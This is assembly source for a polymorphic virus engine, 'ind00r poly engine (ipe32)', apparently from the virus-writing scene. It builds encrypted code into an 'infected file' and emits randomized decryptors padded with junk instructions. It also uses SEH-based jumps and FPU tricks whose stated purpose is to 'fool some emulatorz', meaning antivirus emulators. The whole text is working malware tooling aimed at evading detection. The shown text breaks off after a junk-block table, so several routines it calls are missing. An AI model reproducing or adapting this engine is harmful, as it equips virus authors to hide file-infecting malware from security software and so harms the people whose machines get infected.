;            ┌─╥─────────────────────────────────────────────╥─┐
;            ┌─╥─────────────────────────────────────────────╥─┐
;            │┌╫┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╫┐│
;            ╞╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╡
;            │├╫┼╫┼╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┼╫┼╫┤│
;            │╞╬╪╬╡ ind00r poly engine (ipe32) v1.0 final ╞╬╪╬╡│
;            │├╫┼╫┼───────────────────────────────────────┼╫┼╫┤│
;            │╞╬╪╬╡                                       ╞╬╪╬╡│
;            │├╫┼╫┤          04.01.01 ├─┤ by slurp        ├╫┼╫┤│
;            │╞╬╪╬╡                                       ╞╬╪╬╡│
;            │├╫┼╫┼╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┬╥┼╫┼╫┤│
;            ╞╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╬╪╡
;            │└╫┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╨┴╫┘│
;            └─╨─────────────────────────────────────────────╨─┘
;
RANDOM_SEED     equ 0BABAh * 65536 + 0BABEh
MAX_POLY_SIZE   equ 3072
; main procedure: ind00r
; parameters:
;
;                EAX  = size of junk space (in dwords)
;                EDX  = address of junk space
;                ────────┐ this is the RVA of an empty space in (un-
;                         initialized data or padding space). the junk
;                         instructions will write to this area
;                        └──────────────────────────────────────────
;
;                EBX  = address of code to decrypt
;                ────────┐ this is the RVA where the encrypted
;                         code will be stored in the infected file.
;                        └──────────────────────────────────────────
;
;                ECX  = size of code to encrypt (in dwords)
;                ESI ─ code to encrypt
;                EDI ─ area >= 2kb to store the decryptor
;
; returns:       the registers aren't changed except ECX that contains
;                the size of the poly decryptor!
;
; NOTE: '─' is equal to 'points to'
;
; the decryptor constists of junk procedures, decryptor procedures, main
; loop calling the procedures and finally jump to the start address to the
; decrypted code.
ind00r          proc
                pushad                           ; preserve all registers
                call  iInit                      ; initialize poly engine
ind00r_delta:   mov   al, JMP_LONG               ; write jump to main loop
                stosb                            ; store opcode
                push  edi                        ; to reloc jmp l8er
                stosd                            ; store relative offset
                call  WriteJunk                  ; write some junk bytez
                call  iGenProcs                  ; generate procedures
                push  edi                        ; here we want to jump
                call  RelLongJmp                 ; reloc jump to main loop
                or    byte ptr [ebp.nojunk-idelta], 0FFh
                call  iGenLoop                   ; generate main loop
                call  iSEHJump
                sub   edi, [esp.PUSHAD_EDI]      ; calculate decryptor size
                mov   [esp.PUSHAD_ECX], edi      ; ECX = size
                call  iEncrypt                   ; encrypt code!
                popad                            ; restore all registers
                ret                              ; return
ind00r          endp
; main procedure: init
iInit           proc
                ; first of all, calculate new delta offset
                mov   ebp, [esp]
                add   ebp, idelta - offset ind00r_delta ; calculate delta
                                                        ; offset
                ; now init random seed
                push  dword ptr [ebp.RandomConst-idelta]
                pop   dword ptr [ebp.RandomSeed-idelta]

                push  edi                   ; push destination index
                lea   edi, [ebp.InitValues-idelta] ; table with init values

                ; let's store parameterz
                stosd                       ; store size of junk space
                xchg  eax, edx
                stosd                       ; store address of junk space
                xchg  eax, ebx
                stosd                       ; store decrypt rva
                xchg  eax, ecx
                stosd                       ; size of code
                xchg  eax, esi
                stosd                       ; address of code

                ; mix the registers
                lea   esi, [ebp.preg-idelta]
                push  USED_REGS
                call  MixBytes

                ; get number of junk procedures (1 - 5)
                push  JUNK_PROCS      ; 0 - 3
                call  rnd32r
                add   al, MIN_PROCS
                mov   [ebp.ProcCount-idelta], al   ; number of procedures

                ; put the procedures in random order
                lea   esi, [ebp.ProcedureOrder-idelta]
                push  eax
                call  MixBytes

                ; put procedure calls in random order
                lea   esi, [ebp.CallOrder1-idelta]
                push  CALL_ORDER_1
                call  MixBytes

                lea   esi, [ebp.CallOrder2-idelta]
                mov   ecx, eax
                sub   al, CALL_ORDER_2 + 1
                push  eax
                call  MixBytes

                ; get random parameter count for each procedure
                lea   edi, [ebp.ProcParameters-idelta]
                mov   cl, MAX_PROCS
i_par_loop:     push  MAX_PARAMS + 03h       ;   0 - MAX_PARAMS + 2
                call  rnd32r
                sub   al, 02h
                jnc   i_lamest
                xor   eax, eax
i_lamest:       stosb
                loop  i_par_loop
                xor   eax, eax
                stosb

                ; get random key, encryption & key increment type
                lea   edi, [ebp.CryptKey-idelta]
                call  rnd32
                stosd                        ; write key
                call  rnd32
                stosd                        ; write key increment
                push  ENC_RND
                call  rnd32r
                stosb                        ; write encryption type
                push  KEY_RND
                call  rnd32r
                stosb                        ; write key increment type
                pop   edi                    ; pop destination index
                and   word ptr [ebp.InLoop-idelta], 00h
                ret
iInit           endp
; main procedure: encrypt
iEncrypt        proc
                pushad
                lea   esi, [ebp.CryptSize-idelta]
                lodsd                   ; CryptSize
                xchg  eax, ebx
                lodsd                   ; EncryptRVA
                xchg  eax, edi
                lodsd                   ; CryptKey
                xchg  eax, ecx
                lodsd                   ; KeyIncrement
                xchg  eax, edx

encrypt_loop:   mov   al, [ebp.CryptType-idelta] ; get encryption type
                cmp   al, ENC_XOR         ; XOR encryption?
                jnz   ie_not_xor          ; no, check next
                xor   [edi], ecx          ; yes, XOR [preg], key
ie_not_xor:     cmp   al, ENC_ADD         ; ADD decryption?
                jnz   ie_not_add          ; no, check next
                sub   [edi], ecx          ; yes, SUB [preg], key
ie_not_add:     cmp   al, ENC_SUB         ; SUB decryption?
                jnz   ie_not_sub          ; no, check next
                add   [edi], ecx          ; yes, ADD [preg, key
ie_not_sub:     cmp   al, ENC_ROL         ; ROL decryption?
                jnz   ie_not_rol          ; no, check next
                ror   dword ptr [edi], cl ; rotate dword
ie_not_rol:     cmp   al, ENC_ROR         ; ROR decryption?
                jnz   ie_not_ror          ; no, jmp to key increment
                rol   dword ptr [edi], cl ; rotate dword
ie_not_ror:     xchg  ecx, edx
                mov   al, [ebp.KeyIncType-idelta] ; get key increment type
                cmp   al, KEY_ROL         ; ROL key increment?
                jnz   ie_n_rol            ; no, check next
                rol   edx, cl             ; rotate key
ie_n_rol:       cmp   al, KEY_ROR         ; ROR key increment?
                jnz   ie_n_ror            ; no, check next
                ror   edx, cl             ; rotate key
ie_n_ror:       cmp   al, KEY_INC         ; ADD key increment?
                jnz   ie_n_inc            ; no, check next
                add   edx, ecx            ; increment key
ie_n_inc:       cmp   al, KEY_DEC         ; SUB key increment?
                jnz   ie_n_dec            ; no
                sub   edx, ecx            ; decrement key
ie_n_dec:       xchg  ecx, edx
                scasd                     ; increment pointer by 4
                dec   ebx
                jnz   encrypt_loop
                popad
                ret
iEncrypt        endp
; main generator: generate procedure body and some junk around the real
;                 instructions.
iGenProcs       proc
                ; get number of procedures into counter
                movzx ecx, byte ptr [ebp.ProcCount-idelta]
                xor   ebx, ebx  ; set up another counter that counts from 0

                ; for choosin' procedures
                call  rnd32
                xchg  dh, al

gp_loop:        push  ecx
                ; getting number of current procedure
                push  ebx
                movzx ebx, byte ptr [ebp.ProcedureOrder-idelta+ebx]
                                                    ; ID # of 1st procedure
                mov   [ebp.CurrentProc-idelta], bl  ; for junk gen to
                                                    ; identify current proc
                ; store procedure address
                mov   [ebp.ProcAddress-idelta+4*ebx], edi

                ; get number of parameters
                mov   dl, [ebp.ProcParameters-idelta+ebx]
                test  dl, dl                  ; if no parameter,
                jz    gp_np_entry             ; generate no entry
                ; if procedure has parameters we need to set up EBP
                ; choose between two (similar) entrys:
                ;       ENTER 0000h,00h
                ;             or
                ;       PUSH  EBP
                ;       MOV   EBP, ESP
                test  dh, 01h
                jz    gp_psh_entry
                xor   eax, eax                ; no local variables
                mov   al, PROC_ENTER          ; opcode for enter
                stosd                         ; store instruction
                jmp   gp_np_entry
gp_psh_entry:   mov   eax, PUSH_REG or REG_EBP or (100h * MOV_EBP_ESP)
                stosd
                dec   edi                     ; wrote 3 bytes
gp_np_entry:    push  ebx
                call  iProcJunk
                pop   ebx
                cmp   ebx, JUNK_PROC
                jnb   gp_junk_proc
                mov   esi, [ebp.Generatorz-idelta+ebx*4]
                add   esi, ebp
                push  edx
                call  esi                     ; call di generator
                pop   edx
gp_junk_proc:   call  iProcJunk               ; make some junk

                mov   eax, edx
                xor   ah, ah
                shl   eax, 08h xor 02h        ; shift left one byte + * 4
                xor   al, PROC_RETP           ; generate ret (with params)
                test  ah, ah                  ; do we have parameters?
                jz    gp_no_par

                mov   byte ptr [edi], POP_REG or REG_EBP
                test  dh, 01h
                jz    gp_psh_exit
                xor   byte ptr [edi], PROC_LEAVE xor (POP_REG or REG_EBP)
gp_psh_exit:    inc   edi                       ; write pop ebp/leave

                stosd                           ; store RET opcode (C2h)
                dec   edi                       ; only store 3 bytes
                jmp   gp_par
gp_no_par:      inc   eax
                stosb                           ; store RET opcode (C3h)

gp_par:         call  WriteJunk

                pop   ebx
                inc   ebx                       ; increment count
                pop   ecx
                loop  gp_loop
                ret
iGenProcs       endp
; generates main loop with some junk between callz.
iGenLoop        proc
                or    byte ptr [ebp.InLoop-idelta], 01h
                lea   esi, [ebp.CallOrder1-idelta]
                movsx ecx, byte ptr [ebp.ProcCount-idelta]
                or    byte ptr [ebp.CurrentProc-idelta], 0FFh
gl_call_lp:     xor   eax, eax
                lodsb                           ; get numbah of proc
                xchg  eax, ebx
                inc   byte ptr [ebp.CurrentProc-idelta]
                cmp   byte ptr [ebp.CurrentProc-idelta], DECRYPT_DATA
                jne   gl_yxcmv
                push  edi
gl_yxcmv:
                push  ecx
                movsx ecx, byte ptr [ebp.ProcParameters-idelta+ebx]
                push  ebx
                test  ecx, ecx                  ; 0 parameterz?
                jz    gl_no_par                 ; don't loop
gl_push_lp:
                call  iPushJunk
                loop  gl_push_lp
gl_no_par:
                pop   ebx
                mov   edx, [ebp.ProcAddress-idelta+4*ebx]
                mov   byte ptr [edi], CALL_DIRECT ; write call opcode
                inc   edi
                neg   edi
                lea   eax, [edx+edi-04h]
                neg   edi
                stosd
                pop   ecx                       ; outer loop counter
                loop  gl_call_lp
                mov   bl, [ebp.creg-idelta]    ; generate check if counter
                call  gCheckReg                ; reg is zero
                mov   ax, ESC_2BYTE xor ((JMPC_LONG xor COND_NE) * 100h)
                stosw                            ; generate JNZ
                pop   eax
                neg   edi
                lea   eax, [eax+edi-04h]         ; eax = eax - (edi + 04h)
                neg   edi
                stosd                            ; store jump offset
                ret
iGenLoop        endp
; generate jump to code
iSEHJump        proc
                mov   edx, [ebp.DecryptRVA-idelta] ; where to jump after
                                                   ; decryption

                ; 1. let's put offset to code on stack

                call  rnd32
                test  al, 01h
                jz    isj_npd

                ; generate PUSH offset CODE
                mov   al, PUSH_IMM                 ; push 32-bit immediate
                stosb
                xchg  eax, edx
                stosd                              ; immediate value
                jmp   isj_npd0

                ; load reg with value and push reg
isj_npd:        call  rnd32
                and   al, REG_EDI
                cmp   al, REG_ESP
                je    isj_npd
                xchg  eax, ebx
                push  ebx
                call  gLoadReg
                pop   eax
                xor   al, PUSH_REG
                stosb

                ; 2. let's clear a reg to index fs:[0]

isj_npd0:       ; get a random register & clear it
                call  rnd32
                and   al, REG_EDI
                cmp   al, REG_ESP
                je    isj_npd0
                mov   ebx, eax
                call  gClearReg
                xchg  eax, ecx

                ; 3. put da old handler on stack

                mov   al, OVERRIDE_FS
                stosb
                xor   ch, ch
                xor   esi, esi
                call  rnd32
                test  al, 01h
                jz    isj_dir
                mov   bh, OPTYPE_MOV
                call  rnd32
                and   al, 02h
                add   bh, al
isj_gnr:        call  rnd32
                and   al, REG_EDI
                cmp   al, cl
                je    isj_gnr
                mov   bl, al
                mov   al, OPSIZE_32
                mov   ah, REG_MEM
                call  ciOpRMReg
                xchg  eax, ebx
                xor   al, PUSH_REG
                stosb
                jmp   isj_dir0
isj_dir:        mov   al, OP_GROUP5
                stosb
                mov   bl, P_PUSH
                call  ciCreateOperand
isj_dir0:
                ; 4. now set new handler to ESP

                mov   al, OVERRIDE_FS
                stosb
                mov   bx, REG_ESP xor (OPTYPE_MOV * 100h)
                mov   ax, OPSIZE_32 xor (MEM_REG * 100h)
                call  ciOpRMReg

                ; 5. let's create some junk that causes exception

                push  03h
                pop   ecx
ex_junk_loop:   push  ecx
                push  OPTYPE_CMP
                call  rnd32r
                xchg  eax, ebx
                call  rnd32
                test  al, 01h
                jz    isj_suck
                mov   bh, bl
                call  rnd32
                and   al, REG_EDI
                mov   bl, al
                push  03h
                call  rnd32r
                mov   ah, MEM_REG
                call  ciOpRMReg
                jmp   isj_suck0
isj_suck:       call  rnd32
                xchg  eax, edx
                push  03h
                call  rnd32r
                call  ciOpRMImm

isj_suck0:      pop   ecx
                loop  ex_junk_loop
                ret
iSEHJump        endp
; load start RVA into pointer register
iProcLdPtr      proc
                mov   edx, [ebp.DecryptRVA-idelta]
                mov   bl, [ebp.preg-idelta]
                jmp   gLoadReg
iProcLdPtr      endp
; load size into counter register
iProcLdCnt      proc
                mov   edx, [ebp.CryptSize-idelta]
                mov   bl, [ebp.creg-idelta]
                jmp   gLoadReg
iProcLdCnt      endp
; load key into key register
iProcLdKey      proc
                mov   edx, [ebp.CryptKey-idelta]
                mov   bl, [ebp.kreg-idelta]
                jmp   gLoadReg
iProcLdKey      endp
; decrypt data word
iProcDecData    proc
                mov   cl, [ebp.preg-idelta]  ; operand = ptr reg
                call  rnd32                  ; get random bit
                mov   bl, 08h
                cmp   byte ptr [ebp.CryptType-idelta], ENC_SUB
                jbe   dd_not_chk_ecx
                cmp   cl, REG_ECX
                jne   dd_not_chk_ecx
                or    al, 01h                ; set 1st bit
dd_not_chk_ecx:
                test  al, 01h            ; is it zero?
                jz    blaaah             ; yes, use direct encryption

                ; create MOV/XCHG junkreg, [preg] (indirect encryption)

dd_get_jnk_reg: call  iGetJunkReg
                cmp   al, REG_ECX            ; is it ECX?
                je    dd_get_jnk_reg         ; yes, use other junk reg
                mov   bl, al
                xor   al, MOD_REG
                push  eax                    ; push code reg for later use
                mov   bh, OPTYPE_MOV         ; generate MOV
                call  rnd32                  ; random numbah
                and   al, 02h
                add   bh, al                 ; zero, use MOV
                                             ; non-zero, use XCHG
                xor   esi, esi               ; no displacement
                mov   al, OPSIZE_32          ; dword, of course
                mov   ah, REG_MEM            ; from memory to register
                call  ciOpRMReg
                pop   ecx
                call  iBlockJunkAR
blaaah:
                ; test for encryption type
                mov   al, [ebp.CryptType-idelta]
                cmp   al, ENC_XOR
                jnz   dd_not_xor
                mov   bh, OPTYPE_XOR   ; generate XOR jreg/[preg], kreg
dd_not_xor:     cmp   al, ENC_ADD
                jnz   dd_not_add
                mov   bh, OPTYPE_ADD   ; generate ADD jreg/[preg], kreg
dd_not_add:     cmp   al, ENC_SUB
                jnz   dd_not_sub
                mov   bh, OPTYPE_SUB   ; generate SUB jreg/[preg], kreg

dd_not_sub:     ja    dd_rotate        ; generate ROR/ROL jreg/[preg], kreg
                push  ecx
                mov   al, OPSIZE_32
                mov   ah, MEM_REG
                mov   bl, [ebp.kreg-idelta]
                xor   ch, ch
                xor   esi, esi
                call  ciOpRMReg
                jmp   dd_exit


dd_rotate:      push  ecx              ; code reg/pointer reg
                push  eax
                push  ecx

                ; we'll generate
                ;
                ; shift on [preg]:
                ;
                ;    push  ecx                 (only if kreg <> ECX)
                ;    mov   ecx, kreg           (  "  "    "   "  " )
                ;    ror   [preg], cl          (rol/ror)
                ;    pop   ecx                 (only if kreg <> ECX)
                ;
                ;
                ; shift on junkreg:  (this variant is forced if preg = ECX)
                ;
                ;    mov   junkreg, [preg]     (xchg/mov)
                ;    push  ecx                 (only if kreg <> ECX)
                ;    mov   ecx, kreg
                ;    ror   junkreg, cl         (rol/ror)
                ;    pop   ecx
                ;    mov   [preg], junkreg     (xchg/mov)
                ;
                ; junkreg must not be ECX

                mov   al, [ebp.kreg-idelta]    ; load key register

                cmp   al, REG_ECX              ; ECX?
                jz    dd_no_push               ; yes, no need to push ecx

                or    al, MOD_REG
                xchg  eax, ecx

                push  REG_ECX
                call  iIsJReg
                cmp   eax, 0FFFFFFFFh
                jnz   dd_ecx_isj

                mov   al, PUSH_REG xor REG_ECX ; generate PUSH ECX
                stosb                          ; store opcode
                pop   ebx
                call  iBlockJunkAR
                push  ebx
dd_ecx_isj:     xchg  eax, edx

                mov   bx, REG_ECX xor (OPTYPE_MOV * 100h) xor MOD_REG
                call  rnd32
                mov   al, OPSIZE_32
                and   ah, REG_MEM
                jnz   dd_nxchg
                xchg  bl, cl
dd_nxchg:
                call  ciOpRMReg                ; generate mov ecx, kreg

dd_askdjh:      call  iGetJunkReg
                pop   ebx
                push  ebx
                and   ebx, REG_EDI
                cmp   eax, ebx
                je    dd_askdjh
                cmp   al, REG_ECX
                je    dd_askdjh
                xchg  eax, ebx
                call  iRndJunk
dd_no_push:
                pop   ecx
                pop   eax

                mov   bl, ROR_SHIFT            ; shift type ROR
                cmp   al, ENC_ROR              ; is it ROR?
                jz    dd_enc_ror               ; yes, skip
                dec   ebx                      ; decrement shift type (ROL)
dd_enc_ror:
                mov   al, OPSIZE_32
                mov   bh, SHIFT_CL
                xor   ch, ch                   ; no SIB addressin'
                xor   esi, esi
                call  ciShiftRM

                xchg  eax, edx
                cmp   al, PUSH_REG xor REG_ECX
                jnz   dd_no_pop
                pop   ebx
                push  ebx
                and   ebx, REG_EDI
                call  iBlockJunkAR
                xor   al, PUSH_REG xor POP_REG
                stosb
dd_no_pop:

dd_exit:        pop   ebx                      ; pop code/ptr reg
                mov   eax, ebx
                and   al, MOD_REG
                xor   al, MOD_REG
                jnz   dd_not_save_reg
                and   ebx, REG_EDI
                call  iBlockJunkAR
                mov   cl, [ebp.preg-idelta]
                mov   bh, OPTYPE_MOV
                call  rnd32
                and   al, 02h
                add   bh, al
                mov   ax, OPSIZE_32 or (MEM_REG * 100h)
                xor   ch, ch
                xor   esi, esi
                call  ciOpRMReg
dd_not_save_reg:
                ret

iProcDecData    endp

; increment key
iProcIncKey     proc
                mov   edx, [ebp.KeyIncrement-idelta] ; load key increment
                call  iGetJunkReg                    ; get random junk reg
                xchg  eax, ecx
                mov   ebx, ecx
                mov   al, [ebp.KeyIncType-idelta] ; get key increment type
                mov   bh, OPTYPE_ADD              ; first assume ADD
                cmp   al, KEY_DEC                 ; check if decrement key
                jnz   pik_not_sub                 ; nope, ADD
                mov   bh, OPTYPE_SUB              ; yes, SUB
pik_not_sub:    ja    pik_rotate                  ; > KEY_DEC: rotate!

                call  rnd32
                test  al, 01h
                jz    pik_direct                  ; don't load reg

                push  ebx
                call  gLoadReg            ; move key increment into reg
                pop   ebx
                call  iBlockJunkAR
                xor   bl, MOD_REG
                mov   cl, [ebp.kreg-idelta]      ; get key reg
                xor   ecx, 0FFFFFF00h xor MOD_REG
                push  02h
                call  rnd32r
                test  eax, eax
                jz    pik_blah
                xchg  bl, cl
pik_blah:
                mov   ah, al
                mov   al, OPSIZE_32
                jmp   ciOpRMReg                  ; create instruction
pik_direct:
                mov   al, OPSIZE_32
                mov   bl, bh
                mov   cl, [ebp.kreg-idelta]
                or    ecx, 0FFFFFF00h xor MOD_REG

                jmp   ciOpRMImm

pik_rotate:     xor   bl, bl                     ; ROL shift
                cmp   al, KEY_ROR
                jnz   pik_not_ror
                inc   ebx                        ; ROR shift

pik_not_ror:    mov   ah, dl
                and   ah, 1Fh
                mov   bh, SHIFT_IMM
                mov   al, OPSIZE_32
                mov   cl, [ebp.kreg-idelta]
                xor   cl, MOD_REG
                call  ciShiftRM
                ret
iProcIncKey     endp
; increment pointer by 4
iProcIncPtr     proc
                push  04h                       ; we have 4 methods
                call  rnd32r                    ; to do so
                mov   cl, [ebp.preg-idelta]
                xor   cl, MOD_REG               ; pointer reg, of course
                push  04h
                pop   edx                       ; mov edx, 4 (optimized :P)
                test  al, al
                jnz   pip_not_add
                mov   bl, OPTYPE_ADD
pip_not_add:    cmp   al, 01h
                jnz   pip_not_sub
                neg   edx
                mov   bl, OPTYPE_SUB
pip_not_sub:    cmp   al, 02h
                jnz   pip_not_adc
                mov   bl, OPTYPE_ADC
                dec   edx
                mov   byte ptr [edi], SET_CRY
                inc   edi
pip_not_adc:    cmp   al, 03h
                jnz   pip_not_lea

                ; generate lea preg, [preg + 04h]
                mov   byte ptr [edi], LOAD_EA
                inc   edi
                and   cl, REG_RND - 1
                mov   bl, cl
                push  esi
                xchg  edx, esi
                xor   ch, ch
                call  ciCreateOperand
                pop   esi
                ret
pip_not_lea:    mov   al, OPSIZE_32
                jmp   ciOpRMImm
                ret
iProcIncPtr     endp
; decrement counter
iProcDecCnt     proc
                push  05h
                call  rnd32r
                mov   cl, [ebp.creg-idelta]
                or    cl, MOD_REG
                xor   edx, edx
                test  al, al
                jnz   pdc_not_dec

                ; generate DEC creg
                mov   al, DEC_REG
                or    al, [ebp.creg-idelta]
                stosb
                ret
pdc_not_dec:    cmp   al, 01h
                jnz   pdc_not_add_FF

                ; generate ADD creg, -1
                mov   bl, OPTYPE_ADD
                dec   edx
pdc_not_add_FF: cmp   al, 02h
                jnz   pdc_not_sbb

                ; generate STC, SBB creg, 0
                mov   byte ptr [edi], SET_CRY
                inc   edi
                mov   bl, OPTYPE_SBB

pdc_not_sbb:    cmp   al, 03h
                jnz   pdc_not_lea
                ; generate LEA creg, [creg - 1]

                mov   byte ptr [edi], LOAD_EA
                inc   edi
                and   cl, REG_RND - 1
                mov   bl, cl
                push  esi
                xor   esi, esi
                dec   esi
                xor   ch, ch
                call  ciCreateOperand
                pop   esi
                ret

pdc_not_lea:    cmp   al, 04h
                jnz   pdc_not_sub
                ; generate SUB creg, 1
                mov   bl, OPTYPE_SUB
                inc   edx

pdc_not_sub:    mov   al, OPSIZE_32
                jmp   ciOpRMImm
iProcDecCnt     endp

; fool some emulatorz
iProcFPUFool    proc

                ; initialize FPU
                mov   eax, FPU_WAIT or (FPU_INIT * 100h) or 'X' * 1000000h
                stosd
                dec   edi

                ; choose random address to store result
                call  iGetWrMem
                push  GF_METHCNT                ; choose between 4 methods
                call  rnd32r
                push  eax
                inc   eax
                mov   edx, eax

                ; store initial value in memory
                mov   al, OPSIZE_32
                mov   bl, OPTYPE_MOV
                call  ciOpRMImm

                call  iRndRegJ

                ; load dword from address into fpu register
                call  rnd32
                and   al, FPU_WORD_LDST
                or    al, FPU_INT_LDST
                mov   bl, FPU_LOAD
                stosb
                call  ciCreateOperand

                ; calculate address of method and execute it!
                pop   eax
                push  eax
                mov   ebx, [ebp.gf_methods-idelta+4*eax]
                add   ebx, ebp
                call  ebx

                ; write back dword from st(0)
                call  iGetWrMem
                call  rnd32
                and   al, FPU_WORD_LDST xor FPU_INT_LDST
                xor   al, FPU_INT_LDST
                mov   bl, FPU_STORE
                stosb
                call  ciCreateOperand
                call  iRndRegJ

                ; check returned value of FPU instructions.

                pop   eax
                push  edi            ; label1 in ECX (see below)
                movzx edx, byte ptr [ebp.gf_rslt_table-idelta+eax]
                push  03h
                call  rnd32r
                add   al, OPTYPE_SUB            ; SUB, CMP or XOR
                xchg  eax, ebx
                xor   al, al
                push  edi
                call  ciOpRMImm

                ; if not equal, generate endless loop (fuck some emulatorz)

                ; generate JZ or JNZ
                pop   ebx
                pop   ecx
                mov   al, ah              ; get another random byte
                test  al, 40h
                jnz   gf_as1              ; not zero, jump after junk
                xchg  ecx, ebx
gf_as1:

                call  rnd32               ; random dword
                and   al, 01h
                jz    gf_el1              ; zero, generate JZ

                ;  jump back before compare instruction or afta
                ;
                ;  label1:       <access mem junk>
                ;  label2:       CMP/SUB/XOR
                ;                JNZ  label2/label3

                xchg  eax, ecx
                mov   byte ptr [edi], JMPC_SHORT xor COND_NZ
                inc   edi
                sub   eax, edi            ; calculate relative offset
                dec   eax                 ; we need to dec rel
                stosb                     ; write relative jmp offset
                ret

gf_el1:
                ;
                ;                JZ   label2/label3
                ;  label1:       <junk>
                ;                JMP  label1
                ;  label2:       <junk>
                ;  label3:
                ;
                xchg  eax, ecx
                mov   byte ptr [edi], JMPC_SHORT xor COND_Z
                inc   edi
                push  edi
                inc   edi
                call  iBlockJunk
                mov   byte ptr [edi], JMP_SHORT
                inc   edi
                sub   eax, edi
                dec   eax
                stosb
                push  edi
                call  iBlockJunk
                mov   ebx, edi
                pop   ecx
                mov   al, ah              ; get another random byte
                test  al, 20h
                jnz   gf_as2
                xchg  ecx, ebx
gf_as2:         xchg  eax, ecx
                pop   eax
                neg   eax
                lea   ebx, [edi+eax-01]
                neg   eax
                mov   [eax], bl

gf_xit:
                ret

gf_rslt_table   db    03h, 07h, 02h, 00h

gf_meth1:       call  rnd32
                and   al, 01h
                jz    gf_meth11
                mov   ax, FPU_LDPI
                stosw
                call  iBlockJunk
                mov   al, FPU_WORD_OP
                stosb
                mov   bl, FPU_MULP
gf_meth1e:      mov   cl, REG_ST1 or MOD_REG
                jmp   ciCreateOperand

gf_meth11:      mov   ax, FPU_LDLG2
                stosw
                call  iBlockJunk
                mov   al, FPU_WORD_OP
                stosb
                mov   bl, FPU_DIVP
                jmp   gf_meth1e

gf_meth2:       mov   ax, FPU_LDL2T
                stosw
                call  iBlockJunk
                mov   al, FPU_DWORD_OP
                stosb
                mov   bl, FPU_MUL
                mov   cl, REG_ST1 or MOD_REG
                jmp   ciCreateOperand


gf_meth3:       mov   ax, FPU_LDLN2
                stosw
                call  iBlockJunk
                mov   ax, FPU_SQRT
                stosw
                mov   al, FPU_QWORD_OP
                stosb
                mov   bl, FPU_MUL
                mov   cl, REG_ST1 or MOD_REG
                call  ciCreateOperand
                mov   ax, FPU_DWORD_LDST or (100h * (MOD_REG xor 09h))
                stosw
                ret

gf_methods      equ   $
                dd    offset gf_meth1-idelta
                dd    offset gf_meth2-idelta
                dd    offset gf_meth3-idelta
GF_METHCNT      equ   3
iProcFPUFool    endp
; main procedure: generate 1-3 different junk blockz
iProcJunk       proc
                push  ecx              ; preserve counter
                push  03h              ; get random number between 0 and 4
                call  rnd32r
                inc   eax              ; add 1 (1 - 3)
                xchg  eax, ecx         ; load into counter
                call  iBlockJunk       ; generate junk blocks
                loop  $ - 05h
                pop   ecx              ; restore counter
                ret
iProcJunk       endp
; main procedure: generate 1 junk block
iBlockJunk      proc
                mov   bl, 08h
iBlockJunkAR:                            ; avoid register in ebx
                test  byte ptr [ebp.nojunk-idelta], 0FFh
                jz    bj_sueder
                ret
bj_sueder:
                pushad
                push  BJ_BLOCKCNT        ; choose between multiple methods
                call  rnd32r
                mov   edx, [ebp.bj_blockz-idelta+4*eax] ; get address of
                add   edx, ebp           ; method procedure & relocate
bj_nxtr:        call  iGetJunkReg        ; get a junk reg
                cmp   al, bl             ; test if we shouldn't touch it
                je    bj_nxtr            ; yes, get another junk reg
                xchg  ebx, eax           ; junk reg in EAX
                call  edx                ; execute method
                mov   [esp], edi
                popad
                ret

                ; junk block 1:
                ; 1. <compare/sub register/memory with constant>
                ; 2. <conditional jump to 4.>
                ; 3. <2 - 4 junk instructions>
                ; 4.
bj_block1:      push  ebx                ; save register 4 l8er use
                mov   dh, bl
                mov   bl, OPTYPE_SUB
                call  rnd32              ; get random number
                and   al, 02h            ; 0/2
                add   bl, al             ; OPTYPE_SUB + 2 = OPTYPE_CMP
                call  rnd32
                and   al, 01h
                mov   dl, al             ; dl = 0/1 (reg/junk)
                test  dl, dl
                jz    bj_b1_nreg1
                call  rnd32
                and   al, REG_EDI        ; 00000xxx random reg
                xor   al, MOD_REG        ; 11000xxx set reg bits
                xchg  eax, ecx
                jmp   bj_b1_nmem1
bj_b1_nreg1:    call  iGetMemory         ; get readable memory
bj_b1_nmem1:    cmp   bl, OPTYPE_SUB     ; if not SUB, get read only
                jnz   bj_b1_nro          ; register or memory
                test  dl, dl
                jz    bj_b1_nreg2
                mov   cl, dh             ; writeable register
                xor   ecx, 0FFFFFF00h xor MOD_REG
                jmp   bj_b1_nro
bj_b1_nreg2:    call  iGetWrMem
bj_b1_nro:      mov   al, bl
                xor   al, MOD_REG
                test  al, MOD_REG
                jz    bj_b1_regalign
                call  iOpSizeMem
                jmp   bj_b1_blah
bj_b1_regalign: call  iOpSizeReg
bj_b1_blah:     push  eax
                call  rnd32
                xchg  eax, edx
                call  rnd32
                test  al, 01h
                jz    bj_b1_akldf
                movsx edx, dl
bj_b1_akldf:    pop   eax
                call  ciOpRMImm
                pop   ebx
                call  rnd32
                and   al, 0Fh            ; get random conditional jump type
                xor   al, JMPC_SHORT     ; make jump opcode
                stosb                    ; store it
                push  edi                ; push address of immediate
                stosb                    ; store placeholder byte
                call  iRndJunk           ; make some junk
                pop   eax
                not   eax
                lea   ebx, [edi+eax]     ; relative address
                not   eax
                mov   [eax], bl          ; store relative jump address
                ret
                ; junk block 2:
                ; 1. <push junk>
                ; 2. <2 - 4 junk instructions>
                ; 3. <pop junk>
bj_block2:      call  iPushJunk
                call  iRndJunk           ; make some junk
                jmp   iPopJunk

bj_block3:      call  rnd32              ; generate STC/CLC/STD/CLD
                and   al, 05h
                xor   al, 0F8h
                stosb
                jmp   iRndJunk

bj_blockz       equ   $
                dd    offset bj_block1 - idelta
                dd    offset bj_block2 - idelta
                dd    offset bj_block3 - idelta
                dd    offset iRndJunk - idelta
                dd    offset iRndJunk - idelta
